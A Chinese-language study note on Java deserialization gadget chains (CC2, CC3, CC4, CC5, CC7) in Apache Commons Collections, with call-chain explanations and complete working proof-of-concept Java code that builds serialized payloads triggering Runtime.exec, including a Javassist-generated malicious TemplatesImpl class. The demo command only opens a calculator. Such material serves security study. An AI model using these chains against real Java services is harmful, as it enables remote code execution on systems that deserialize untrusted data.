---
created: '21/11/07'
title: 反序列化CC篇补充
tags:
  - java
  - java安全
  - 反序列化
---
# 反序列化CC篇补充

## CC2

### 入口
首先，CC2的使用条件是commons-collections4.x版本，为什么不能用3.x版本呢？因为`TransformingComparator`类在3.x版本中没有实现`Serializable`接口，无法被序列化。
所以我们先在pom.xml中添加以下依赖:
```xml
<dependency>  
 <groupId>org.apache.commons</groupId>  
 <artifactId>commons-collections4</artifactId>  
 <version>4.0</version>  
</dependency>
```

CC2的入口使用了`PriorityQueue`和`TransformingComparator`，其readObject方法会最终调用到`comparer.comare`，而`TransformingComparator`的`compare`方法则会调用`this.transformer.transform`方法，从而拼接上链的后半部分。

### PriorityQueue关键代码
调用链为`PriorityQueue.readObject()`->`PriorityQueue.heapify()`->`PriorityQueue.siftDown()`->`PriorityQueue.siftDownUsingComparator()`->`comparator.compare()`:
```java
public class PriorityQueue<E> extends AbstractQueue<E> implements java.io.Serializable {
 // ...
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in size, and any hidden stuff
        s.defaultReadObject();

        // Read in (and discard) array length
        s.readInt();

        SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);
        queue = new Object[size];

        // Read in all elements.
        for (int i = 0; i < size; i++)
            queue[i] = s.readObject();

        // Elements are guaranteed to be in "proper order", but the
        // spec has never explained what that might be.
        heapify();
    }
    private void heapify() {
        for (int i = (size >>> 1) - 1; i >= 0; i--)
            siftDown(i, (E) queue[i]);
    }
    private void siftDown(int k, E x) {
        if (comparator != null)
            siftDownUsingComparator(k, x);
        else
            siftDownComparable(k, x);
    }
    private void siftDownUsingComparator(int k, E x) {
        int half = size >>> 1;
        while (k < half) {
            int child = (k << 1) + 1;
            Object c = queue[child];
            int right = child + 1;
            if (right < size &&
                comparator.compare((E) c, (E) queue[right]) > 0)
                c = queue[child = right];
            if (comparator.compare(x, (E) c) <= 0)
                break;
            queue[k] = c;
            k = child;
        }
        queue[k] = x;
    }
// ...
}
```

### TransformingComparator关键代码
```java
public class TransformingComparator<I, O> implements Comparator<I>, Serializable {
    public int compare(I obj1, I obj2) {
        O value1 = this.transformer.transform(obj1);
        O value2 = this.transformer.transform(obj2);
        return this.decorated.compare(value1, value2);
    }
}
```

### 初始版本的poc
#### poc
poc如下:
```java
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;

public class CC2 {
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1),
        };

        // 先使用fakeTransformer防止本地命令执行
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        TransformingComparator comparator = new TransformingComparator(transformerChain);
        PriorityQueue queue = new PriorityQueue(1);

        queue.add(1);
        queue.add(2);


        // 使用反射替换transformerChain的transformers
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);
        // 使用反射替换TransformingComparator的comparator
        f = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        f.setAccessible(true);
        f.set(queue,comparator);


        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}
```

这个poc有几个需要注意的点:
1. 需要往queue里add两个值进去，这是为了其size能大于1，能进入heapify中for循环的逻辑
2. 需要在add值之后才通过反射设置comparator，这是因为add存在以下调用链: `PriorityQueue.add()`->`PriorityQueue.offer()`->`PriorityQueue.siftUp()`->`siftUpUsingComparator()`->`comparator.compare()`，这会导致我们的链提前触发，而且会产生报错(这里参考了 https://paper.seebug.org/1242/#commonscollections-2 这篇文章，但是经过测试提前设置并不会出错)

#### 调用逻辑
整条链的调用逻辑为:
```
PriorityQueue.readObject()
  PriorityQueue.heapify()
  PriorityQueue.siftDown()
  PriorityQueue.siftDownUsingComparator()
  comparator.compare() === TransformingComparator.compare()
    ChainedTransformer.transform()
      ConstantTransformer.transform() // 获取Runtime.class
      InvokerTransformer.transform()   // 获取Runtime.getRuntime
      InvokerTransformer.transform()   // 获取Runtime实例
      InvokerTransformer.transform()   // 调用exec方法触发rce
```

### 另外一个版本的poc
另外一个版本的poc的终点不再是我们熟悉的`ChainedTransformer`那一套回调造成的命令执行，而是可以造成任意java代码执行的`TemplatesImpl`:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211107182759.png)
跟进`getTransletInstance`:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211107182830.png)
再跟进`defineTransletClasses`:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211107182941.png)

这里通过loader.defineClass将bytecodes还原为Class，接着在外面又调用了`_class[_transletIndex].newInstance`方法实例化还原的Class，所以我们可以构造一个恶意类字节码，其具有恶意的static语句块，导致任意java代码执行。也就是说，我们可以通过`TemplatesImpl.newTransformer`方法来执行恶意类的static语句块。

这里我们就需要额外了解一些知识，需要了解javassit这个库，这是一个用来处理Java 字节码的类库，我们需要简单学习它的使用。
#### javassit
##### maven依赖
```xml
<dependency>
    <groupId>org.javassist</groupId>
    <artifactId>javassist</artifactId>
    <version>3.25.0-GA</version>
</dependency>
```
##### 简单使用
我们可以通过这个代码来实现生成java字节码:
```java
import javassist.*;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

public class javassit_test {
    public static void createPseson() throws Exception {

        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.makeClass("Cat");
        String cmd = "Runtime.getRuntime().exec(\"calc.exe\");";
        // 创建 static 代码块，并插入代码
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        // 生成bytes字节码，等下要用到
        //byte[] classBytes = cc.toBytecode();
        // 写入.class 文件
        cc.writeFile("./");
    }

    public static void main(String[] args) {
        try {
            createPseson();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
生成的代码大概如下:
```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

public class EvilCat32193904579700 extends AbstractTranslet {
    static {
        Runtime.getRuntime().exec("calc.exe");
    }

    public EvilCat32193904579700() {
    }
}
```

#### poc
了解了javassit知识之后，我们就可以构建我们最后的poc了:
```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.PriorityQueue;

public class CC2 {
    public static TemplatesImpl generateEvilTemplates() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        // 创建 static 代码块，并插入代码
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        // 转换为bytes
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", targetByteCodes);
        // 进入 defineTransletClasses() 方法需要的条件
        setFieldValue(templates, "_name", "name" + System.nanoTime());
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        return templates;
    }

    public static void main(String[] args) throws Exception {
        Transformer transformer = new InvokerTransformer("newTransformer", null, null);
        TransformingComparator comparator = new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(2);
        TemplatesImpl templates = generateEvilTemplates();
        setFieldValue(queue, "queue", new Object[]{templates,1});
        setFieldValue(queue, "size", 2);
        setFieldValue(queue, "comparator", comparator);

        //序列化和反序列化
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }


    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        System.out.println(field);
        System.out.println(value);
        field.set(obj, value);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
```

#### 调用逻辑
```
PriorityQueue.readObject()
  PriorityQueue.heapify()
  PriorityQueue.siftDown()
  PriorityQueue.siftDownUsingComparator()
  comparator.compare() === TransformingComparator.compare()
    InvokerTransformer.transform()
      TemplatesImpl.newTransformer()
        TemplatesImpl.getTransletInstance() 
          TemplatesImpl.defineTransletClasses()  // 定义类
        ...  // 创建类实例，触发static代码块
```


## CC3
CC1和CC2的混合体，CC1的前段和CC2的后段，用到了一个新的类`TrAXFilter`，其构造函数会调用其属性的`newTransformer`
#### 调用逻辑
```
AnnotationInvocationHandler.readObject()
  Proxy.entrySet() // readObject调用了proxy的某些方法，回调invoke
    Proxy.invoke() === AnnotationInvocationHandler.invoke()
        LazyMap.get()
        ChainedTransformer.transform()
          InvokerTransformer.transform()
          InstantiateTransformer.transform()
          newInstance()
            TrAXFilter#TrAXFilter()
              TemplatesImpl.newTransformer()
                TemplatesImpl.getTransletInstance() 
                  TemplatesImpl.defineTransletClasses()  // 定义类
                ...  // 创建类实例，触发static代码块
```



## CC4
基本上是CC2，只是换成了类`TrAXFilter`，其的构造函数会调用其属性的`newTransformer`
#### 调用逻辑
```
PriorityQueue.readObject()
  PriorityQueue.heapify()
  PriorityQueue.siftDown()
  PriorityQueue.siftDownUsingComparator()
  comparator.compare() === TransformingComparator.compare()
    ChainedTransformer.transform()
      InvokerTransformer.transform()
      InstantiateTransformer.transform()
      newInstance()
        TrAXFilter#TrAXFilter()
          TemplatesImpl.newTransformer()
            TemplatesImpl.getTransletInstance() 
              TemplatesImpl.defineTransletClasses()  // 定义类
            ...  // 创建类实例，触发static代码块
```

## CC5

### 入口
CC5与CC6非常相似，不同的地方是通过`TiedMapEntry.toString`方法而非`TiedMapEntry.hashCode`方法触发`TiedMapEntry.getValue`从而触发`LazyMap.get`。
```java
public class TiedMapEntry implements Entry, KeyValue, Serializable {
    //...
    public String toString() {  
     return this.getKey() + "=" + this.getValue();  
    }
}
```
同样的，我们需要找到一个反序列化的入口，其`readObject`会触发属性的`toString`方法，这里用到的是`BadAttributeValueExpException`这个类，其类结构大致如下:
```java
public class BadAttributeValueExpException extends Exception   {
    // ...
    
    public BadAttributeValueExpException (Object val) {
        this.val = val == null ? null : val.toString();
    }
    
    public String toString()  {
        return "BadAttributeValueException: " + val;
    }

    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
 }
```
可以看到这里只要满足条件就会触发`valObj.toString()`方法，而`valObj`其实就是`this.val`，是我们可以控制的。

### 最终poc
我们只需要对CC6链稍作修改即可，这里需要注意的是我们同样使用反射技术修改`BadAttributeValueExpException.val`，其原因也是因为如果我们通过构造函数直接设置为`TiedMapEntry`的话会造成本地命令执行:
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC5 {
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1),
        };

        // 先使用fakeTransformer防止本地命令执行
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "keykey");

        BadAttributeValueExpException obj = new BadAttributeValueExpException(1);

        // 使用反射替换transformerChain的transformers
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);
        // 使用反射替换BadAttributeValueExpException的val
        f = BadAttributeValueExpException.class.getDeclaredField("val");
        f.setAccessible(true);
        f.set(obj, tiedMapEntry);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(obj);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}
```

### 调用逻辑
整条链的调用逻辑为:
```
BadAttributeValueExpException.readObject()
  valObj.toString() === TiedMapEntry.toString()
    TiedMapEntry.getValue()
      LazyMap.get()
         ChainedTransformer.transform()
	      ConstantTransformer.transform() // 获取Runtime.class
	      InvokerTransformer.transform()   // 获取Runtime.getRuntime
	      InvokerTransformer.transform()   // 获取Runtime实例
	      InvokerTransformer.transform()   // 调用exec方法触发rce
```

## CC7
### 入口
CC7稍微有点复杂，利用的是`Hashtable.equals`方法去触发`LazyMap.get`。
详情分析[通俗易懂的Java Commons Collections 5、6、7分析 - 先知社区](https://xz.aliyun.com/t/10457#toc-11)

### 最终poc
```java
package top.longlone;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7 {
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(0)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1),
        };


        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 2);

        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 2);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 1);
        lazyMap2.remove("yy");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashtable);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
    }
}
```

### 调用逻辑
整条链的调用逻辑为:
```
Hashtable.readObject()
  Hashtable.reconstitutionPut()
    org.apache.commons.collections.map.AbstractMapDecorator.equals() === java.util.AbstractMap.equals()
        LazyMap.get()
           ChainedTransformer.transform()
            ConstantTransformer.transform() // 获取Runtime.class
            InvokerTransformer.transform()   // 获取Runtime.getRuntime
            InvokerTransformer.transform()   // 获取Runtime实例
            InvokerTransformer.transform()   // 调用exec方法触发rce
```